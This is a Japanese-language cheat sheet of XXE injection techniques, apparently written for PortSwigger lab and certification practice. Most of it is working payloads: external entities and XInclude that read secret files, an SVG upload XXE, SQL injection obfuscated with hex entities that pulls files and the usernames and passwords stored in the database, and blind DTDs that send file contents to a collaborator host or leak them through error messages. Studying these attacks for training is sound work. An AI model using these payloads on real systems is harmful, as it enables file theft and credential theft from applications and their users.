###### & SSRF

- [⚡️SSRF](../SSRF/⚡️SSRF.md#&%20XXE)

---
### 非blind

###### 非blind XXEi基本形

```http
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```

---
#### Xinclude file read

```http
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
```

---
#### image file upload機能のXXE

###### SVGの場合
1. 下記`/home/carlos/secret`を任意のファイルパスに変更し、ファイルアップロード
```svg
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
2. アップロードしたsvgファイルを新しいタブで画像を開くで閲覧

###### DOCXの場合
- [4. 隠れたXXEi脆弱性の発見](4.%20隠れたXXEi脆弱性の発見.md#DOCXへXXEiする方法)

---
#### SQL & XML & HackVertor

Stage2 & Stage 3
🚨難読化の必要があるときはSQLmapは使用不可

- POSTリクエストのXML bodyが以下だとする
```xml
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			2
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

###### ⭐️/home/carlos/secretの抽出

クエリをHVで難読化(`hex_entities` or `dec_entities`)しつつ、いずれかのパラメタに対して....

- ファイルの読み取り or アプリ内のフォルダへの出力
```xml
<@hex_entities>1 UNION all select load_file('/home/carlos/secret')<@/hex_entities>  
```
```xml
<@hex_entities>1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'<@/hex_entities>
```
- もし`UNION all`がうまくいかないなら[詳細なcheatsheet](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#sql-injection)を見るしかない

###### usernameとpassword抽出

クエリをHVで難読化(`hex_entities` or `dec_entities`)しつつ、いずれかのパラメタに対して....

- まずは[SQLi cheatsheet: Database contents](https://portswigger.net/web-security/sql-injection/cheat-sheet#:~:text=SELECT%20%40%40version-,Database%20contents,-You%20can%20list)で、抽出したいカラムを抽出する
	- もし`*`が使えないのであれば...↓

- [2. SQLi UNION攻撃](../SQLi/2.%20SQLi%20UNION攻撃.md)と[3. DBの構成情報の探索](../SQLi/3.%20DBの構成情報の探索.md)で抽出できるカラム数、抽出したいテーブル、抽出したいカラムを割り出す必要があるかも...(面倒)

- usernameとpasswordカラムを1行で抽出するペイロード例(PostgreSQL)
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

- [LAB](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

---
### Blind

#### DTD Blind Out-of-band

- Check stock機能

1. エクスプロイトサーバに以下をホストする(ファイル名は `/exploit.dtd`に変更)
```http
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
```
```dtd
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR_DOMAIN/?x=%file;'>">
%eval;
%exfil;
```
2. "Check stock"機能リクエストのXML bodyを編集してリクエストする
```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT_DOMAIN/exploit.dtd"> %xxe;]>
<stockCheck>
...
```
3. CollaboratorのRequest to Collaboratorタブに`/?x=`パラメタ値として情報が記載
- [LAB](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
###### ちょっとした制限

- `/etc/passwd`のような、出力に改行文字を含むものは取得できないケースがある
- 改行文字を含まない他の機密情報(`/home/carlos/secret`等）を取得してみる
- もしくはHTTPの代わりにFTPプロトコルを使用してみる。(PortSwiggerでは無いシナリオ)
- or [⚡️XXEi](#DTD%20Blind%20Error%20messages)

---
#### DTD Blind Error messages

[⚡️XXEi](#DTD%20Blind%20Out-of-band)が無理だった時
1. エクスプロイトサーバに以下をホストする(File: `/exploit.dtd`)
```dtd
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
2. "Check Stock"機能リクエストのXML bodyを編集してリクエスト
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT_DOMAIN/exploit.dtd"> %xxe;]>
  <stockCheck>
    <productId>
	  1
	</productId>
	<storeId>
	  1
	</storeId>
</stockCheck>
```
3. レスポンスのエラーメッセージに`/etc/passwd`が表示されているか確認する


